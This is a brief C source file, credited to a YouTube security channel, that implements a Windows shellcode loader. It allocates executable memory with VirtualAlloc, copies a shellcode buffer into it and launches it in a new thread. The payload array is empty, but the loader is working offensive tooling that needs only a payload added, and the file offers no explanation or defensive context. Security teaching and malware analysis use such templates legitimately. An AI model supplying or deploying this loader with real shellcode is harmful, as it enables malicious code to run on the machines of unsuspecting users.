# Gemini Cyber Security @ https://www.youtube.com/@gemini_security #

#include <windows.h>
#include <stdio.h>

int main() {

	unsigned char shellcode[] = "";

	LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	MoveMemory(alloc_mem, shellcode, sizeof(shellcode));

	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
	WaitForSingleObject(tHandle, INFINITE);

	return 0;
}
